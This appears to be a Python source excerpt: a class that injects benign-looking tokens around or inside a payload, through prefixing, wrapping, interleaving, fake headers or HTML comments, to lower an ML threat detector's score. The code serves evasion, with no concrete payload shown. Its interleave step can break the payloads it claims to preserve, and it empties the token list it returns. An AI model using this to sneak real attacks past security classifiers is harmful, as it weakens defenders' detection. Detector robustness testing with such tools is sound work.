class BenignTokenInjector:
    """
    Injects high-confidence benign tokens into payloads to dilute
    their ML threat score while preserving malicious functionality.
    """

    INJECTION_STRATEGIES = [
        "prefix",       # Add benign content before payload
        "suffix",       # Add benign content after payload
        "wrap",         # Wrap payload in benign structure
        "interleave",   # Interleave benign tokens with payload
        "header_inject", # Inject as HTTP headers
        "comment_hide",  # Hide in comments
    ]

    @classmethod
    def inject_tokens(
        cls,
        payload: str,
        num_tokens: int = 3,
        strategy: str = "interleave",
        token_categories: Optional[List[str]] = None,
    ) -> Tuple[str, List[str]]:
        """
        Inject benign tokens into a payload.

        Args:
            payload: The original malicious payload
            num_tokens: Number of benign tokens to inject
            strategy: Injection strategy to use
            token_categories: Categories of benign tokens to use

        Returns:
            Tuple of (mutated_payload, list_of_injected_tokens)
        """
        if token_categories is None:
            token_categories = list(BENIGN_TOKENS.keys())

        # Collect available tokens
        available_tokens = []
        for category in token_categories:
            if category in BENIGN_TOKENS:
                available_tokens.extend(BENIGN_TOKENS[category])

        if not available_tokens:
            return payload, []

        # Select random tokens
        selected_tokens = random.sample(
            available_tokens,
            min(num_tokens, len(available_tokens))
        )

        # Apply injection strategy
        mutated = cls._apply_strategy(payload, selected_tokens, strategy)
        return mutated, selected_tokens

    @classmethod
    def _apply_strategy(
        cls,
        payload: str,
        tokens: List[str],
        strategy: str,
    ) -> str:
        """Apply the injection strategy."""
        token_text = "\n".join(tokens)

        strategies = {
            "prefix": lambda: f"{token_text}\n{payload}",
            "suffix": lambda: f"{payload}\n{token_text}",
            "wrap": lambda: f"{tokens[0] if tokens else ''}\n{payload}\n{token_text}",
            "interleave": lambda: cls._interleave(payload, tokens),
            "header_inject": lambda: cls._header_inject(payload, tokens),
            "comment_hide": lambda: f"<!-- {token_text} -->\n{payload}\n<!-- {token_text} -->",
        }

        return strategies.get(strategy, strategies["interleave"])()

    @classmethod
    def _interleave(cls, payload: str, tokens: List[str]) -> str:
        """Interleave benign tokens between payload characters."""
        if not tokens:
            return payload
        
        parts = []
        chunk_size = max(1, len(payload) // (len(tokens) + 1))
        
        for i in range(0, len(payload), chunk_size):
            parts.append(payload[i:i + chunk_size])
            if tokens:
                parts.append(tokens.pop(0))
        
        return "".join(parts)

    @classmethod
    def _header_inject(cls, payload: str, tokens: List[str]) -> str:
        """Inject tokens as HTTP-style headers."""
        header_block = "\n".join(f"X-Benign-{i}: {token[:50]}" 
                                 for i, token in enumerate(tokens))
        return f"{header_block}\n\n{payload}"


